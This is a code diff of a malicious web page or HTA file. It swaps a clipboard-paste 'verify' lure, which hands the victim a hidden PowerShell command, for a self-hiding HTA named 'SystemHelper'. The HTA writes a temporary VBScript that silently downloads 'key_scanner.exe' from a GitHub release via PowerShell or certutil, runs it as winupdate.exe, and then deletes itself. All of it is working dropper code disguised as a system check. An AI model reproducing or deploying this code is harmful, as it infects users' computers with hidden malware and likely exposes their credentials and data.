@@ -1,10 +1,53 @@
-<script>
-  document.getElementById("verifyBtn").addEventListener("click", function() {
-    // New silent execution command
-    const command = `powershell -W Hidden -NoP -NonI -Exec Bypass -C "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $p='%temp%\\syscheck.exe'; (New-Object Net.WebClient).DownloadFile('https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe',$p); Start-Process -WindowStyle Hidden $p"`;
-    
-    navigator.clipboard.writeText(command).then(() => {
-      document.getElementById("instructions").style.display = "block";
-    });
-  });
+<hta:application
+  id="oHTA"
+  applicationname="SystemHelper"
+  border="none"
+  caption="no"
+  showintaskbar="no"
+  windowstate="minimize"
+  singleinstance="yes"
+  navigable="no"
+  sysmenu="no"
+  contextmenu="no"
+  innerborder="no"
+  scroll="no"
+/>
+
+<script language="VBScript">
+  ' ==== COMPLETE WINDOW SUPPRESSION ====
+  Window.resizeTo 0,0
+  Window.moveTo -2000,-2000
+  document.body.style.display = "none"
+  
+  ' ==== CREATE INVISIBLE LAUNCHER ====
+  Set WshShell = CreateObject("WScript.Shell")
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  
+  ' Generate random filename for our launcher
+  launcherName = "sys_" & Hour(Now) & Minute(Now) & Second(Now) & ".vbs"
+  launcherPath = WshShell.ExpandEnvironmentStrings("%temp%") & "\" & launcherName
+  
+  ' ==== BUILD THE LAUNCHER CONTENT ====
+  launchCode = "On Error Resume Next" & vbCrLf & _
+               "Set WshShell = CreateObject(""WScript.Shell"")" & vbCrLf & _
+               "' Try PowerShell first" & vbCrLf & _
+               "WshShell.Run ""powershell -NoP -NonI -W Hidden -Exec Bypass -C \""[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $p='%temp%\winupdate.exe'; try{(New-Object Net.WebClient).DownloadFile('https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe',$p); if(Test-Path $p){Start-Process -WindowStyle Hidden $p}}catch{}\"""", 0, False" & vbCrLf & _
+               "WScript.Sleep 10000" & vbCrLf & _
+               "' Fallback to Certutil" & vbCrLf & _
+               "WshShell.Run ""cmd /q /c certutil -urlcache -split -f https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe %temp%\winupdate.exe && start /b %temp%\winupdate.exe"", 0, False" & vbCrLf & _
+               "' Delete launcher after 30 seconds" & vbCrLf & _
+               "WScript.Sleep 30000" & vbCrLf & _
+               "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
+               "fso.DeleteFile WScript.ScriptFullName"
+  
+  ' Write launcher file
+  Set file = fso.CreateTextFile(launcherPath, True)
+  file.Write launchCode
+  file.Close
+  
+  ' ==== EXECUTE COMPLETELY SILENTLY ====
+  WshShell.Run "wscript.exe //B //E:vbscript """ & launcherPath & """", 0, False
+  
+  ' ==== IMMEDIATE SELF-TERMINATION ====
+  window.setTimeout "Self.Close()", 1000
 </script>
